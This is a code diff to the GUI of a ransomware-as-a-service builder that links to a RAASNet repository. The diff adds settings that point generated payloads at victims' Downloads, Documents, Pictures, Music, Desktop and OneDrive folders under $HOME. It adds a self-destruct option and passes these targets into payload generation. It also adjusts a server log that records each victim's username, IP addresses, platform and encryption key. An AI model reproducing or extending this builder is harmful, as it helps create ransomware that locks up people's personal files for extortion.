@@ -171,6 +171,10 @@ class MainWindow(Tk):
             'ext' : StringVar(),
             'target_ext' : StringVar(),
             'new_target_ext' : StringVar(),
+            'target_dirs' : StringVar(),
+            'new_target_dirs' : StringVar(),
+            'working_dir' : StringVar(),
+            'new_working_dir' : StringVar(),
             'remove_payload' : IntVar(),
 
         }
@@ -191,7 +195,15 @@ class MainWindow(Tk):
         self.options['type'].set('pycrypto')
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
+        self.options['remove_payload'].set(0)
+        self.options['working_dir'].set('$HOME')
 
+        self.options['target_dirs'].set('''Downloads
+Documents
+Pictures
+Music
+Desktop
+Onedrive''')
         self.options['target_ext'].set('''txt
 ppt
 pptx
@@ -569,32 +581,36 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.gen.bind("<Escape>", self.close_generate) # Press ESC to close window
 
         mode_frame = LabelFrame(self.gen, text = 'Mode')
-        mode_frame.grid(row = 0, column = 0)
+        mode_frame.grid(row = 0, column = 0, sticky = 'nw')
         Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 1).grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 2, command = self.check_settings).grid(row = 1, column = 0, sticky = 'w')
         Checkbutton(mode_frame, text = "Fullscreen mode", variable = self.options['full_screen_var'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')
 
         server_frame = LabelFrame(self.gen, text = 'Remote Server')
-        server_frame.grid(row = 0, column = 1)
+        server_frame.grid(row = 0, column = 1, sticky = 'nw')
         Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['host'], width = 20).grid(row = 0, column = 1)
         Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
         options_frame = LabelFrame(self.gen, text = 'Options')
-        options_frame.grid(row = 0, column = 3, sticky = 'w')
+        options_frame.grid(row = 0, column = 2, sticky = 'nw')
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
 
         content_frame = LabelFrame(self.gen, text = 'Content')
-        content_frame.grid(row = 1, column = 0, sticky = 'w')
+        content_frame.grid(row = 1, column = 0, sticky = 'nw')
         set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
         set_img = Button(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)
         set_ext = Button(content_frame, text = 'CUSTOM FILE EXTENTIONS', command = self.set_ext, width = 25).grid(row = 2, column = 0)
 
+        target_frame = LabelFrame(self.gen, text = 'Content')
+        target_frame.grid(row = 1, column = 1, sticky = 'nw')
+        set_dirs = Button(target_frame, text = 'SET TARGET DIRS', command = self.set_dirs, width = 25).grid(row = 0, column = 0)
+
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
-        enc_frame.grid(row = 1, column = 1, sticky = 'w')
+        enc_frame.grid(row = 1, column = 2, sticky = 'w')
         Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 1, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 2, column = 0, sticky = 'w')
@@ -654,6 +670,32 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.options['target_ext'].set(self.options['new_target_ext'].get('1.0', END))
         self.extentions.destroy()
 
+    def set_dirs(self):
+        self.dirs = Toplevel()
+        self.dirs.title(string = 'Set File Extentions')
+        self.dirs.configure(background = 'white')
+        self.dirs.resizable(0,0)
+
+        self.dirs.bind("<Escape>", self.close_set_target_dirs)
+
+        Label(self.dirs, text = 'Working Directory', background = 'white').grid(row = 0, column = 0, sticky = 'w')
+        self.options['new_working_dir'] = Entry(self.dirs, width = 30)
+        self.options['new_working_dir'].grid(row = 1, column = 0, sticky = 'n')
+
+        Label(self.dirs, text = 'Target Directories', background = 'white').grid(row = 2, column = 0, sticky = 'w')
+        self.options['new_target_dirs'] = Text(self.dirs, height = 10, width = 40)
+        self.options['new_target_dirs'].grid(row = 3, column = 0)
+
+        save = Button(self.dirs, text = 'SAVE', command = self.change_target_dirs, width = 15).grid(row = 4, column = 0)
+
+        self.options['new_working_dir'].insert(END, self.options['working_dir'].get())
+        self.options['new_target_dirs'].insert(END, self.options['target_dirs'].get())
+        self.options['new_working_dir'].focus()
+
+    def change_target_dirs(self):
+        self.options['target_dirs'].set(self.options['new_target_dirs'].get('1.0', END))
+        self.dirs.destroy()
+
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
@@ -671,6 +713,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['mode'].get(),
                 self.options['debug'].get(),
                 self.options['target_ext'].get(),
+                self.options['target_dirs'].get(),
                 self.options['remove_payload'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
@@ -780,11 +823,11 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
                                 result = '''
 [Occured]    -> %s %s
-[USERNAME]   -> %s
-[REMOTE IP]  -> %s
-[LOCAL IP]   -> %s
-[SYSTEM]     -> %s
-[KEY]        -> %s
+[Username]   -> %s
+[Remote IP]  -> %s
+[Local IP]   -> %s
+[Platform]   -> %s
+[Key]        -> %s
 
 ''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, key)
 
@@ -852,6 +895,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def close_set_target_ext(self, event):
         self.extentions.destroy()
+
+    def close_set_target_dirs(self, event):
+        self.dirs.destroy()
 
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
